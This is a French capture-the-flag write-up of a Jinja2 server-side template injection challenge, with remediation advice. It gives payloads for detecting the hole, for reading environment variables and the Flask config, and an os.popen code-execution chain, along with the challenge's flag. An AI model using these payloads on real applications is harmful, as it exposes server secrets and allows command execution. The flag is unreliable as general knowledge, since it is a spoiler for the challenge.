# Writeup — SSTI Notes

**Catégorie** : Web  
**Difficulté** : Medium  
**Points** : 150  
**Flag** : `CTF{jinja2_ssti_oops}`

## Contexte

Le Server-Side Template Injection (SSTI) se produit quand une application passe des données utilisateur directement à un moteur de template. Avec Jinja2 (Flask), cela permet d'exécuter du code Python arbitraire côté serveur.

## Étapes de résolution

### 1. Identifier la vulnérabilité

Entrer `{{7*7}}` dans le champ note. Si le rendu affiche `49` au lieu de `{{7*7}}`, le SSTI est confirmé.

### 2. Lire les variables d'environnement

```
{{request.environ.get('FLAG')}}
```

Ou via la config Flask :

```
{{config.items()}}
```

### 3. Exécution de code (bonus)

```
{{''.__class__.__mro__[1].__subclasses__()[xxx].__init__.__globals__['os'].popen('id').read()}}
```

## Payload final

Coller dans le champ note :
```
{{request.environ.get('FLAG')}}
```

**Résultat** : `CTF{jinja2_ssti_oops}`

## Correction

Ne jamais passer de données utilisateur à `render_template_string()`. Utiliser `render_template()` avec des fichiers templates, ou échapper les entrées avec `Markup.escape()`.
